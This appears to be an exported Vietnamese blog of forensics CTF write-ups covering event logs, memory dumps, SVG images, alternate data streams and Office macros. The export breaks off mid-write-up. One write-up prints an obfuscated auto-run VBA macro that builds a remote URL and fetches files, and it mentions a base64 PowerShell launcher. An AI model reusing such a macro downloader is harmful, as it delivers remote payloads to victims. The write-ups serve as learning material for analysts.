
[{"content":"Hello ! My name is yatogami (aka kozybear), my major is Cyber Security. I play CTF from August 2023 until now, and I’m a member of Huntik team and TAS_DihydroMonoxide team.\nI’m a newbie and always want to learn about Cyber Security - specially is DFIR. Thanks for reading my blog. Hope you can find something helpful in here!!!\n","date":"2 December 2024","externalUrl":null,"permalink":"/about/","section":"No Exist","summary":"\u003cp\u003eHello ! My name is yatogami (aka kozybear), my major is Cyber Security. I play CTF from August 2023 until now, and I’m a member of \u003ca href=\"https://ctftime.org/team/127635\" target=\"_blank\"\u003eHuntik team\u003c/a\u003e and \u003ca href=\"https://ctftime.org/team/351063\" target=\"_blank\"\u003eTAS_DihydroMonoxide\u003c/a\u003e team.\u003c/p\u003e\n\u003cp\u003eI’m a newbie and always want to learn about Cyber Security - specially is DFIR. Thanks for reading my blog. Hope you can find something helpful in here!!!\u003c/p\u003e","title":"About","type":"page"},{"content":"","date":"2 December 2024","externalUrl":null,"permalink":"/","section":"No Exist","summary":"","title":"No Exist","type":"page"},{"content":"","date":"28 October 2024","externalUrl":null,"permalink":"/tags/forensics/","section":"Tags","summary":"","title":"Forensics","type":"tags"},{"content":"","date":"28 October 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":" 1.For/Event code hunt # Maya Elmer managed to seize one of The Consortium\u0026rsquo;s computers, but when she tried to access a critical file, a sudden blue box flashed across her screen, and the file was instantly encrypted. Now, with the clock ticking, participants must step in to decrypt the file and uncover the hidden contents. The Consortium\u0026rsquo;s encryption is tough to crack, and only the most determined will succeed in revealing the secrets locked away within.\nAuthor: Trent\nType: Medium\nSolution # Thử thách cung cấp các file như sau:\n╰─ tree . ├── Application.evtx ├── encrypt_flag.txt ├── PowershellOP.evtx ├── Security.evtx ├── System.evtx └── Windows_Powershell.evtx Mình kiểm tra file Windows_Powershell.evtx nhưng không có gì. Đến file PowershellOP.evtx, ở 1 trong các EID 4104 - Execute a remote command, mình thấy 1 dòng như sau:\nCreating Scriptblock text (1 of 1): \u0026#34;import sys`n`ndef process_data(input_bytes, key):`n key_bytes = key.encode(\u0026#39;utf-8\u0026#39;)`n return bytearray([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(input_bytes)])`n`ndef main():`n if len(sys.argv) != 4:`n print(\u0026#39;Usage: python script.py \u0026lt;input_file\u0026gt; \u0026lt;output_file\u0026gt; \u0026lt;key\u0026gt;\u0026#39;)`n return`n input_file = sys.argv[1]`n output_file = sys.argv[2]`n key = sys.argv[3]`n`n with open(input_file, \u0026#39;rb\u0026#39;) as f:`n input_data = f.read()`n`n result_data = process_data(input_data, key)`n`n with open(output_file, \u0026#39;wb\u0026#39;) as f:`n f.write(result_data)`n`nif __name__ == \u0026#39;__main__\u0026#39;:`n main()\u0026#34; | Set-Content -Path \u0026#34;C:\\Users\\johndoe\\Documents\\Chrome.py\u0026#34;; Get-Content \u0026#34;C:\\Users\\johndoe\\Documents\\Chrome.py\u0026#34; và một dòng EID 4104 khác:\npython3 .\\Documents\\Chrome.py .\\Documents\\flag.txt .\\Documents\\encrypt_flag.txt I_Like_Big_Bytes_And_I_cannot_Lie! Đại khái là dòng đầu tiên sẽ tạo và lưu một đoạn mã Python vào 1 file có tên Chrome.py với chức năng XOR từng byte của file đầu vào với các byte của 1 key và lưu ra file encrypt_flag.txt mà ta được cho ban đầu. Dòng thứ hai sẽ chạy file đó với đủ 3 tham số là file đầu vào, tên file đầu ra và 1 key. Để giải mã thì ta chỉ cần XOR ngược lại các byte là được.\ndef xor_decrypt(encrypted_data, key): key_bytes = key.encode(\u0026#39;utf-8\u0026#39;) decrypted_data = bytearray([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(encrypted_data)]) return decrypted_data def main(): input_file = \u0026#39;./encrypt_flag.txt\u0026#39; # File bị mã hóa output_file = \u0026#39;./decrypted_flag.txt\u0026#39; # File sau giải mã key = \u0026#39;I_Like_Big_Bytes_And_I_cannot_Lie!\u0026#39; # Khóa with open(input_file, \u0026#39;rb\u0026#39;) as f: encrypted_data = f.read() decrypted_data = xor_decrypt(encrypted_data, key) with open(output_file, \u0026#39;wb\u0026#39;) as f: f.write(decrypted_data) if __name__ == \u0026#39;__main__\u0026#39;: main() FLAG: NICC{Maya_Elmer_D3t3cts_Mal1c10us_P4yl04d_1n_3v3ntL0gs}\n2.For/memory puzzle # The Consortium has concealed a critical file within a memory dump, protected by layers of digital obfuscation. Led by Simon Letti, participants must sift through the volatile memory landscape to locate a plaintext key that unlocks the encrypted file. Time is of the essence, as Roko\u0026rsquo;s Basilisk threatens to distort the data with each passing moment. Can you unravel the puzzle before the Basilisk intervenes? \u0026ldquo;Basilisk\u0026rsquo;s whisper will not wait\u0026rdquo; echos through your mind as you enter the file. (Note: If you choose to use volatility2.6, use profile Win10x64_19041)\nAuthor : Trent\nType: Medium\nSolution # Bài cung cấp 1 file dump và 1 file flag.enc. Hướng làm của dạng bài này thường là tìm loại mã hóa để giải mã. Mình dùng plugin pslist để xem các tiến trình:\n... 8400 848 PhoneExperienc 0xb1084157b300 18 - 1 False 2024-10-18 06:42:44.000000 UTC N/A Disabled 8568 848 RuntimeBroker. 0xb1084137b080 18 - 1 False 2024-10-18 06:42:47.000000 UTC N/A Disabled 8692 848 smartscreen.ex 0xb1083f75b080 8 - 1 False 2024-10-18 06:42:49.000000 UTC N/A Disabled 8748 4976 SecurityHealth 0xb10841990080 7 - 1 False 2024-10-18 06:42:49.000000 UTC N/A Disabled 8784 716 SecurityHealth 0xb1084137c080 15 - 0 False 2024-10-18 06:42:49.000000 UTC N/A Disabled 8864 4976 VBoxTray.exe 0xb1084184c080 12 - 1 False 2024-10-18 06:42:50.000000 UTC N/A Disabled 8936 4976 OneDrive.exe 0xb1084184f080 24 - 1 False 2024-10-18 06:42:50.000000 UTC N/A Disabled 9040 8936 Microsoft.Shar 0xb10841a5a080 0 - 1 False 2024-10-18 06:42:51.000000 UTC 2024-10-18 06:43:01.000000 UTC Disabled 7912 716 svchost.exe 0xb10841664080 7 - 0 False 2024-10-18 06:42:57.000000 UTC N/A Disabled 7256 848 FileCoAuth.exe 0xb10841a57080 4 - 1 False 2024-10-18 06:43:08.000000 UTC N/A Disabled 3848 848 UserOOBEBroker 0xb108420020c0 5 - 1 False 2024-10-18 06:43:16.000000 UTC N/A Disabled 7436 716 svchost.exe 0xb10841744080 15 - 1 False 2024-10-18 06:43:18.000000 UTC N/A Disabled 1148 848 dllhost.exe 0xb10841820080 6 - 1 False 2024-10-18 06:43:35.000000 UTC N/A Disabled 1980 4976 notepad.exe 0xb1084122e080 5 - 1 False 2024-10-18 06:43:38.000000 UTC N/A Disabled 2504 3984 SearchProtocol 0xb1083fe2a080 6 - 1 False 2024-10-18 06:43:38.000000 UTC N/A Disabled 800 848 SystemSettings 0xb10840a2e080 20 - 1 False 2024-10-18 06:43:53.000000 UTC N/A Disabled 3468 848 ApplicationFra 0xb108402102c0 9 - 1 False 2024-10-18 06:43:53.000000 UTC N/A Disabled 6184 848 TextInputHost. 0xb10841122080 13 - 1 False 2024-10-18 06:43:57.000000 UTC N/A Disabled 2292 848 dllhost.exe 0xb1084200a180 12 - 1 False 2024-10-18 06:43:57.000000 UTC N/A Disabled 2172 716 svchost.exe 0xb108414d2080 4 - 0 False 2024-10-18 06:44:07.000000 UTC N/A Disabled 6024 2496 audiodg.exe 0xb1084202c340 5 - 0 False 2024-10-18 06:44:07.000000 UTC N/A Disabled 2656 716 svchost.exe 0xb10840bbb080 11 - 0 False 2024-10-18 06:44:07.000000 UTC N/A Disabled 3372 848 WmiPrvSE.exe 0xb1084200e0c0 7 - 0 False 2024-10-18 06:44:07.000000 UTC N/A Disabled 7564 716 svchost.exe 0xb108417490c0 11 - 0 False 2024-10-18 06:44:07.000000 UTC N/A Disabled 6016 716 SgrmBroker.exe 0xb108420440c0 7 - 0 False 2024-10-18 06:44:07.000000 UTC N/A Disabled 6324 716 svchost.exe 0xb1084172e080 14 - 0 False 2024-10-18 06:44:07.000000 UTC N/A Disabled 3348 4976 DumpIt.exe 0xb108415b0080 3 - 1 True 2024-10-18 06:44:58.000000 UTC N/A Disabled 7660 3348 conhost.exe 0xb10840d1c080 7 - 1 False 2024-10-18 06:44:58.000000 UTC N/A Disabled 2148 1328 taskhostw.exe 0xb10840ce6080 10 - 0 False 2024-10-18 06:45:05.000000 UTC N/A Disabled 3772 848 MoUsoCoreWorke 0xb1084057f080 12 - 0 False 2024-10-18 06:45:05.000000 UTC N/A Disabled 9092 0 0xb1084128d080 1093195368 - N/A False N/A N/A Disabled Mình để ý tiến trình notepad.exe. Dùng plugin notepad để xem có gì.\nExternalObjectOwner C:\\Users\\johndoe\\Desktop\\system_update.py /C:/Users/johndoe/Desktop/system_update.py C:\\Windows\\SYSTEM32\\policymanager.dll .dll C:\\Windows\\system32\\msvcp110_win.dll 0 C:\\Users\\johndoe\\Desktop\\system_update.py 0 /C:/Users/johndoe/Desktop/system_update.py C:\\Users\\johndoe\\Desktop\\system_update.py Users ` ` L -m \\BaseNamedObjects ) ) = 2 \u0026#39;. \u0026gt; ) E A ) 5 = ) ( INE @ dummy://url/ Notepad S S \\BaseNamedObjects\\[CoreUI]-PID(4604)-TID(4708) 26a16690-4734-41d4-9d35-3ade6a325bf6 7 \\BaseNamedObjects\\[CoreUI]-PID(1980)-TID(1972) e3218ed0-2332-4807-ac53-d5faec65b993 ` ` 8 8 8 8 Consolas nsole ` ` # Basilisk\u0026#39;s whisper will not wait import time from Crypto.Cipher import AES from Crypto.Util.Padding import pad import os def main(): key = b\u0026#39;SuperSecretKey12\u0026#39; print(f\u0026#34;Key length: {len(key)} bytes\u0026#34;) with open(\u0026#39;flag.txt\u0026#39;, \u0026#39;rb\u0026#39;) as f: plaintext = f.read() iv = b\u0026#39;\\x00\u0026#39; * 16 cipher = AES.new(key, AES.MODE_CBC, iv=iv) ciphertext = cipher.encrypt(pad(plaintext, AES.block_size)) with open(\u0026#39;flag.enc\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(ciphertext) time.sleep(10) if __name__ == \u0026#39;__main__\u0026#39;: main() ` Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\PackageRepository $ 8 Để ý sẽ thấy đoạn mã Python với file có tên system_update.py, sử dụng mã hóa AES với iv là 16 byte 0x00 và key là SuperSecretKey12. Vứt vào Cyberchef cho nó làm phần còn lại. FLAG: NICC{S1m0n_Tr4v3rses_T1m3}\n3.For/Wont somebody think of the children # If Loab is back, we might need the council to help us out. The problem is that Anna sent Maya looking for them but she still hasn\u0026rsquo;t come back. This is her last known location\u0026hellip; Maybe you can help find her. I\u0026rsquo;d go, but I really don\u0026rsquo;t want to be around those spooky ghost orphans.\nAuthor: CyborgSwOrd\nType: Medium\nSolution # Bài cung cấp 1 file SVG. Mình check virustotal thì không có gì nên yên tâm mở lên thì thấy 1 file ảnh khá to. Ở đây mình thu nhỏ lại cho có cái nhìn toàn cảnh: Mình thử strings nó thì thấy nó được tạo thành từ hơn 30 tấm ảnh khác nhau với cách thức decode base64. Mình sử dụng đoạn mã sau để decode cho từng tấm 1:\nimport base64 import re def extract_and_save_images(input_file): # Mở file để đọc with open(input_file, \u0026#39;r\u0026#39;) as f: lines = f.readlines() # Số thứ tự file hình ảnh image_count = 0 # Biểu thức chính quy để tìm chuỗi Base64 trong thuộc tính href base64_pattern = r\u0026#39;href=\u0026#34;data:image/png;base64,([^\u0026#34;]+)\u0026#34;\u0026#39; for line in lines: # Tìm tất cả các chuỗi Base64 trong dòng matches = re.findall(base64_pattern, line) for match in matches: # Giải mã chuỗi Base64 image_data = base64.b64decode(match) # Tạo tên file hình ảnh (ví dụ: image_0.png, image_1.png, ...) image_count += 1 output_file = f\u0026#39;image_{image_count}.png\u0026#39; # Lưu hình ảnh vào file with open(output_file, \u0026#39;wb\u0026#39;) as img_file: img_file.write(image_data) print(f\u0026#39;Saved: {output_file}\u0026#39;) # Thay thế \u0026#39;input.txt\u0026#39; bằng đường dẫn đến file của bạn extract_and_save_images(\u0026#39;copy.txt\u0026#39;) Mở lên và thấy cờ ở tấm thứ 5: FLAG: NICC{H3ck_th3m_kids_what_@bout_the_council?}\n4.For/Sandy hook river # While lost in time, returning from Puerto Rico, sailing through a sandy-hook river, Simon Letti found a floating bottle with some weird-looking paper inside, which turned out to be a poem. He\u0026rsquo;s still trying to figure out though, what he can do with that: Whispers wound \u0026lsquo;round rocks, rivers writhe, Meandering murk in the moon\u0026rsquo;s muted might, Threads of thrumming, thistle-thought streams, Glimpsed through the gloom, gone unseen. Banks bend backward, breaking breath, Currents carve cryptic creases; death Is a distant drift, dashed and drawn Into eddies of echoes where none belong. Silver-silt serpents sigh, then die, Sluggish susurrations slip and fly. Yet within the wandering wake, Lies a language, languid and opaque. Fluvial fragments fade, Scrawled on surfaces smeared in the shade, Speak in stutters, sharp as stones, But what they whisper remains unknown. Beneath the brine, shadows stir, The Sandy Hook Sea Serpent\u0026rsquo;s blur- A glimmer of scales, a ghost in the tide, A legend where dark secrets hide. In Loch Ness, whispers flow, Where the ancient beast with grace does grow, In waters where dreams intertwine, An echo of history in its shadowy line. In swamps, lizard men roam, Eyes aglow, far from home, A cryptid in murk, slippery and sly, A flicker beneath the night sky. The Chupacabra prowls in shadow cast, Its hunger is a hymn, a threat that lasts, In the hush of night, it waits, A specter stalking through silent fates. It coils through currents, a tale confined, Figures of myth, glimpsed and dreamed, In the whispers of waters, forever esteemed.\nAuthor: malanka\nType: Medium\nSolution # Thử thách cho ta 1 file rar. Extract nó ra mình chỉ thấy 1 file txt. Sau đó mình biết được ở đây nó sử dụng ADS. Mình dùng ADS Scanner và nó phát hiện file rar vừa cho. View stream, mình thấy như sau: Vứt vào Cyberchef, ta được tiếp 1 file rar. Mình nghĩ nó là file rar ban đầu nhưng cứ thử mở thì thấy nó hỏi pass. Giờ mình mới nhớ lại các từ được bôi đậm trong đề bài, ghép chúng lại, mình được pass là: WhisperbreathsighopaquestuttersstonesLoch NessChupacabraesteemed. Mở lên và lụm cờ. FLAG: NICC{AD$_$treamS_4re_$o_P0werfUlL}\n","date":"28 October 2024","externalUrl":null,"permalink":"/posts/spookyctf/","section":"Posts","summary":"\u003ch2 class=\"relative group\"\u003e1.For/Event code hunt \n    \u003cdiv id=\"1forevent-code-hunt\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#1forevent-code-hunt\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eMaya Elmer managed to seize one of The Consortium\u0026rsquo;s computers, but when she tried to access a critical file, a sudden blue box flashed across her screen, and the file was instantly encrypted. Now, with the clock ticking, participants must step in to decrypt the file and uncover the hidden contents. The Consortium\u0026rsquo;s encryption is tough to crack, and only the most determined will succeed in revealing the secrets locked away within.\u003c/p\u003e","title":"Spooky CTF","type":"posts"},{"content":"","date":"28 October 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"Đây là năm đầu tiên CIS được tổ chức. Mình khá hào hứng khi tham gia giải này, vừa cả sợ không làm được bài, vì toàn các đối thủ mạnh thôi. Đây cũng là một cơ hội để mình có ý chí cố gắng hơn, để giỏi hơn nữa. Trong 4 bài Forensics mình chỉ làm được 2 bài. Cảm ơn mọi người đã đọc. Giờ thì bắt đầu thôi.\n1. sexe.zip # Tiếc diên năm 2024, tui đang ở trên toà Phao-sần-palây, tui thấy 1 hiện tượng lạ, có hình có trái tim, có tình iu. Mà tui nói với quý dị là tui mắt thấy tai nghe chứ khum có nằm chiêm bao. Tui thấy một người phụ nữ điẹp thật điẹp, s.exe Flag có 2 phần: Phần thứ nhất nằm trong hình ảnh, phần thứ 2 nằm trong link.\nPass zip: cis2024\nSolution # Bài cho mình 1 file zip và password. Mình unzip file zip và nhận được 1 file eml. Mình dùng trình đọc online, thấy nó chứa 1 file đính kèm và có cả mật khẩu : Down file zip xuống và extract bằng pass đã cho. Dùng olevba check macro, vì code khá dài nên mình chỉ nói đến hàm chính:\nPrivate Sub Document_Open() Dim targetFileName As String targetFileName = \u0026#34;sexe.docm\u0026#34; If ThisDocument.Name = targetFileName Then On Error Resume Next Dim YjB As Variant MjqZthLra YjB = ZvyJxkrbxq() Dim i As Integer Dim x18927312q As String Dim ykajsy98q9 As String Dim z918273aqw As String Dim w128737921 As String Dim o888q87w66 As String Dim q918273912 As String Dim A120382103 As String Dim B817263893 As String Dim C098q0w812 As String Dim D98128703a As String Dim Eoiaoq9098 As String A = ChrW(\u0026amp;H68) \u0026amp; ChrW(\u0026amp;H74) \u0026amp; ChrW(\u0026amp;H74) \u0026amp; ChrW(\u0026amp;H70) \u0026amp; ChrW(\u0026amp;H3A) \u0026amp; ChrW(\u0026amp;H2F) \u0026amp; ChrW(\u0026amp;H2F) \u0026amp; ChrW(\u0026amp;H31) \u0026amp; ChrW(\u0026amp;H39) \u0026amp; ChrW(\u0026amp;H32) \u0026amp; ChrW(\u0026amp;H2E) \u0026amp; ChrW(\u0026amp;H31) \u0026amp; ChrW(\u0026amp;H36) \u0026amp; ChrW(\u0026amp;H38) \u0026amp; ChrW(\u0026amp;H2E) \u0026amp; ChrW(\u0026amp;H35) \u0026amp; ChrW(\u0026amp;H36) \u0026amp; ChrW(\u0026amp;H2E) \u0026amp; ChrW(\u0026amp;H31) \u0026amp; ChrW(\u0026amp;H3A) \u0026amp; ChrW(\u0026amp;H38) \u0026amp; ChrW(\u0026amp;H30) \u0026amp; ChrW(\u0026amp;H38) \u0026amp; ChrW(\u0026amp;H31) \u0026amp; ChrW(\u0026amp;H2F) x18927312q = ChrW(\u0026amp;H68) \u0026amp; ChrW(\u0026amp;H74) \u0026amp; ChrW(\u0026amp;H74) \u0026amp; ChrW(\u0026amp;H70) \u0026amp; ChrW(\u0026amp;H73) \u0026amp; ChrW(\u0026amp;H3A) \u0026amp; ChrW(\u0026amp;H2F) \u0026amp; ChrW(\u0026amp;H2F) A120382103 = \u0026#34;687474703A2F2F6578616D706C652E636F6D2F66616B653120\u0026#34; ykajsy98q9 = ChrW(\u0026amp;H67) \u0026amp; ChrW(\u0026amp;H69) \u0026amp; ChrW(\u0026amp;H74) \u0026amp; ChrW(\u0026amp;H68) \u0026amp; ChrW(\u0026amp;H75) \u0026amp; ChrW(\u0026amp;H62) \u0026amp; ChrW(\u0026amp;H2E) \u0026amp; ChrW(\u0026amp;H63) z918273aqw = ChrW(\u0026amp;H6F) \u0026amp; ChrW(\u0026amp;H6D) \u0026amp; ChrW(\u0026amp;H2F) \u0026amp; ChrW(\u0026amp;H30) \u0026amp; ChrW(\u0026amp;H78) \u0026amp; ChrW(\u0026amp;H4B) \u0026amp; ChrW(\u0026amp;H43) \u0026amp; ChrW(\u0026amp;H53) w128737921 = ChrW(\u0026amp;H43) \u0026amp; ChrW(\u0026amp;H2F) \u0026amp; ChrW(\u0026amp;H64) \u0026amp; ChrW(\u0026amp;H65) \u0026amp; ChrW(\u0026amp;H6D) \u0026amp; ChrW(\u0026amp;H6F) \u0026amp; ChrW(\u0026amp;H2D) \u0026amp; ChrW(\u0026amp;H6F) o888q87w66 = ChrW(\u0026amp;H6E) \u0026amp; ChrW(\u0026amp;H6C) \u0026amp; ChrW(\u0026amp;H79) \u0026amp; ChrW(\u0026amp;H2F) \u0026amp; ChrW(\u0026amp;H72) \u0026amp; ChrW(\u0026amp;H61) \u0026amp; ChrW(\u0026amp;H77) \u0026amp; ChrW(\u0026amp;H2F) q918273912 = ChrW(\u0026amp;H6D) \u0026amp; ChrW(\u0026amp;H61) \u0026amp; ChrW(\u0026amp;H69) \u0026amp; ChrW(\u0026amp;H6E) \u0026amp; ChrW(\u0026amp;H2F) For i = 1 To 98 HxvRibfksk (x18927312q \u0026amp; ykajsy98q9 \u0026amp; z918273aqw \u0026amp; w128737921 \u0026amp; o888q87w66 \u0026amp; q918273912 \u0026amp; YjB(i)) Next i JkYpCwv On Error GoTo 0 End If End Sub Mình chuyển một số hàm thành Python xem nó ra cái gì:\nA = ( chr(0x68) + chr(0x74) + chr(0x74) + chr(0x70) + chr(0x73) + chr(0x3A) + chr(0x2F) + chr(0x2F) + chr(0x67) + chr(0x69) + chr(0x74) + chr(0x68) + chr(0x75) + chr(0x62) + chr(0x2E) + chr(0x63) + chr(0x6F) + chr(0x6D) + chr(0x2F) + chr(0x30) + chr(0x78) + chr(0x4B) + chr(0x43) + chr(0x53) + chr(0x43) + chr(0x2F) + chr(0x64) + chr(0x65) + chr(0x6D) + chr(0x6F) + chr(0x2D) + chr(0x6F) + chr(0x6E) + chr(0x6C) + chr(0x79) + chr(0x2F) + chr(0x72) + chr(0x61) + chr(0x77) + chr(0x2F) + chr(0x6D) + chr(0x61) + chr(0x69) + chr(0x6E) + chr(0x2F) ) print(A) Và nhận được đầu ra là 1 liên kết: https://github.com/0xKCSC/demo-only/raw/main/. Ở đường dẫn demo-only, mình thấy có khá nhiều file có đuôi godefend. Mình clone nó về. Sau đó dùng lệnh ls -lh để kiểm tra dung lượng file. Các file có dung lượng khác lần lượt là 22, 32 và 33. Ở file 22, mình có được phần đầu của flag: Với các file 32 và 33. Mình dùng Detect-it-easy để xem nó là gì vì dung lượng nó khá thấp. Dùng Jetbrains Dotpeak load nó vào vì đây là 1 file C#: Trong phần Resources, mình thấy 1 file mal.ps1. Các lệnh có thể khá phức tạp, tuy nhiên ta chỉ cần để ý đến phần Start-Process -NoNewWindow powershell. Copy đoạn base64, đưa nó vào Cyberchef: Mình thử copy link và search nhưng không thành công. Sau đó mình đếm và biết được phần còn thiếu là 10 kí tự. Đúng với chữ p0wershe1l trong link. Chỉ cần dán vào phần đầu và lụm cờ.\nFLAG: CIS{sexy_h0ney_p0wershe1l}\n2. Tin học văn phòng 2 # It\u0026rsquo;s actually Tin học văn phòng 3\nSolution # Đề bài cho mình 1 file doc. Như thường lệ, mình dùng olevba để check macro. Đây là một phần của đoạn mã, vì nó khá là dài nên mình không copy ra đây hết được. Ban đầu mình stuck khoảng gần 1 nửa thời gian, loanh quanh xem từng hàm một. Sau đó mình bắt đầu để ý đến các hàm được comment, đặc biệt là các dòng chứa từ LitStr, khi nối chúng lại và decode bằng base64 ta sẽ được 1 chuỗi có nghĩa. Mình extract olevba ra 1 file có tên out.txt, sau đó dùng lệnh cat out.txt | grep \u0026quot;LitStr\u0026quot; để lọc ra các dòng chứa từ LitStr. Để ý tiếp : Mình thấy các dòng chứa 0x0004 là nhiều nhất. Nên mình dùng cách tương tự để lấy ra các dòng chứa 0x0004. Sau đó mình dùng VScode loại bỏ các từ không cần thiết. Sau đó vứt nó vào Cyberchef: Mình nhận được cờ ở đây.\nFLAG: CIS2024{Tin_hoc_van_phong_neva_die}\nVà chỉ có như vậy thôi!!!!!\n","date":"30 September 2024","externalUrl":null,"permalink":"/posts/cis-ctf/","section":"Posts","summary":"\u003cp\u003eĐây là năm đầu tiên CIS được tổ chức. Mình khá hào hứng khi tham gia giải này, vừa cả sợ không làm được bài, vì toàn các đối thủ mạnh thôi. Đây cũng là một cơ hội để mình có ý chí cố gắng hơn, để giỏi hơn nữa. Trong 4 bài Forensics mình chỉ làm được 2 bài. Cảm ơn mọi người đã đọc. Giờ thì bắt đầu thôi.\u003c/p\u003e","title":"CIS CTF","type":"posts"},{"content":" 1.For/Portugal # I accidentally left my computer unlocked at the coffee shop while I stepped away. I\u0026rsquo;m sure that someone took advantage of the opportunity and was searching for something. Author : d33znu75\nBài cho 1 file .zip chứa 1 file memdump. Mình dùng plugin pslist của vol3 để xem nó có gì không.\n➜ Portugal /home/cozybear/RealCoZy/ToolList/volatility3/vol.py -f memdump1.mem windows.pslist Volatility 3 Framework 2.7.0 Progress: 100.00 PDB scanning finished PID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime File output 4 0 System 0x8453eb40 110 - N/A False 2024-05-28 10:35:34.000000 N/A Disabled 276 4 smss.exe 0x89897040 3 - N/A False 2024-05-28 10:35:34.000000 N/A Disabled 352 340 csrss.exe 0x89875c40 10 - 0 False 2024-05-28 10:35:34.000000 N/A Disabled 412 340 wininit.exe 0x8f264c40 5 - 0 False 2024-05-28 10:35:35.000000 N/A Disabled 420 404 csrss.exe 0x8f274c40 13 - 1 False 2024-05-28 10:35:35.000000 N/A Disabled 464 404 winlogon.exe 0x8f289c40 7 - 1 False 2024-05-28 10:35:35.000000 N/A Disabled 504 412 services.exe 0x899dda40 18 - 0 False 2024-05-28 10:35:35.000000 N/A Disabled 512 412 lsass.exe 0x8f2af040 11 - 0 False 2024-05-28 10:35:35.000000 N/A Disabled 596 504 svchost.exe 0x8f330040 37 - 0 False 2024-05-28 10:35:35.000000 N/A Disabled 644 504 svchost.exe 0x8f33f500 15 - 0 False 2024-05-28 10:35:35.000000 N/A Disabled 720 464 dwm.exe 0x8f369040 13 - 1 False 2024-05-28 10:35:35.000000 N/A Disabled 836 504 svchost.exe 0x8f3bfb00 55 - 0 False 2024-05-28 10:35:35.000000 N/A Disabled 848 504 svchost.exe 0x8f860300 29 - 0 False 2024-05-28 10:35:35.000000 N/A Disabled 880 504 svchost.exe 0x8f9857c0 24 - 0 False 2024-05-28 10:35:35.000000 N/A Disabled 1004 504 svchost.exe 0x84539880 25 - 0 False 2024-05-28 10:35:35.000000 N/A Disabled 1020 504 svchost.exe 0x845b0840 15 - 0 False 2024-05-28 10:35:35.000000 N/A Disabled 1036 504 svchost.exe 0x845da040 38 - 0 False 2024-05-28 10:35:35.000000 N/A Disabled 1196 504 svchost.exe 0x845bb600 26 - 0 False 2024-05-28 10:35:35.000000 N/A Disabled 1296 504 spoolsv.exe 0x8f8f0040 7 - 0 False 2024-05-28 10:35:36.000000 N/A Disabled 1476 504 svchost.exe 0x921630c0 13 - 0 False 2024-05-28 10:35:36.000000 N/A Disabled 1712 504 MsMpEng.exe 0x984514c0 26 - 0 False 2024-05-28 10:35:36.000000 N/A Disabled 1720 504 svchost.exe 0x98453c40 10 - 0 False 2024-05-28 10:35:36.000000 N/A Disabled 1180 836 sihost.exe 0x984e4580 17 - 1 False 2024-05-28 10:35:37.000000 N/A Disabled 2140 836 taskeng.exe 0x98473a00 7 - 0 False 2024-05-28 10:35:37.000000 N/A Disabled 2160 464 userinit.exe 0x9a0b2040 0 - 1 False 2024-05-28 10:35:37.000000 2024-05-28 10:36:04.000000 Disabled 2228 2160 explorer.exe 0x87a0ec40 64 - 1 False 2024-05-28 10:35:37.000000 N/A Disabled 2488 596 RuntimeBroker. 0x9d62f900 8 - 1 False 2024-05-28 10:35:38.000000 N/A Disabled 2536 836 taskhostw.exe 0x9d632040 9 - 1 False 2024-05-28 10:35:38.000000 N/A Disabled 2620 1020 dasHost.exe 0x9d6cb8c0 18 - 0 False 2024-05-28 10:35:40.000000 N/A Disabled 2832 504 SearchIndexer. 0x8144e040 15 - 0 False 2024-05-28 10:35:41.000000 N/A Disabled 2924 504 NisSrv.exe 0x92185040 9 - 0 False 2024-05-28 10:35:41.000000 N/A Disabled 3180 596 SkypeHost.exe 0x8147ac40 7 - 1 False 2024-05-28 10:35:42.000000 N/A Disabled 3328 596 WmiPrvSE.exe 0x9d60e9c0 10 - 0 False 2024-05-28 10:35:43.000000 N/A Disabled 3464 596 ShellExperienc 0x8153c580 27 - 1 False 2024-05-28 10:35:44.000000 N/A Disabled 3572 596 SearchUI.exe 0x81583c40 37 - 1 False 2024-05-28 10:35:44.000000 N/A Disabled 3780 596 dllhost.exe 0x88fa7980 9 - 1 False 2024-05-28 10:35:44.000000 N/A Disabled 4088 2832 SearchProtocol 0xa2e4a040 7 - 1 False 2024-05-28 10:35:46.000000 N/A Disabled 1596 2832 SearchFilterHo 0x985745c0 6 - 0 False 2024-05-28 10:35:46.000000 N/A Disabled 1740 2832 SearchProtocol 0x9a1e8940 7 - 0 False 2024-05-28 10:35:47.000000 N/A Disabled 3980 1004 audiodg.exe 0x81438640 9 - 0 False 2024-05-28 10:35:54.000000 N/A Disabled 800 2228 FTK Imager.exe 0x8f213c00 22 - 1 False 2024-05-28 10:35:55.000000 N/A Disabled 728 2228 OneDrive.exe 0xa2e47c40 22 - 1 False 2024-05-28 10:35:55.000000 N/A Disabled 1240 2228 chrome.exe 0x9d7d7c40 40 - 1 False 2024-05-28 10:35:56.000000 N/A Disabled 1272 1240 chrome.exe 0xa2ec2840 8 - 1 False 2024-05-28 10:35:56.000000 N/A Disabled 2316 1240 chrome.exe 0x9d787340 14 - 1 False 2024-05-28 10:35:58.000000 N/A Disabled 4104 1240 chrome.exe 0x89928480 16 - 1 False 2024-05-28 10:35:58.000000 N/A Disabled 4112 1240 chrome.exe 0x9d7df900 7 - 1 False 2024-05-28 10:35:58.000000 N/A Disabled 4752 1240 chrome.exe 0x9d7df300 7 - 1 False 2024-05-28 10:36:03.000000 N/A Disabled 4900 1240 chrome.exe 0x815e66c0 15 - 1 False 2024-05-28 10:36:15.000000 N/A Disabled 4968 1240 chrome.exe 0x9d63e040 15 - 1 False 2024-05-28 10:36:16.000000 N/A Disabled 5284 596 dllhost.exe 0x8159cc40 1 - 1 False 2024-05-28 10:36:31.000000 N/A Disabled Thấy có nhiều tiến trình chrome.exe nên mình nghĩ là author đã search gì đó trên chrome. Ở đây mình có 2 cách để làm bài này.\nCách 1: Sử dụng plugin chromehistory của vol2\n(venv) 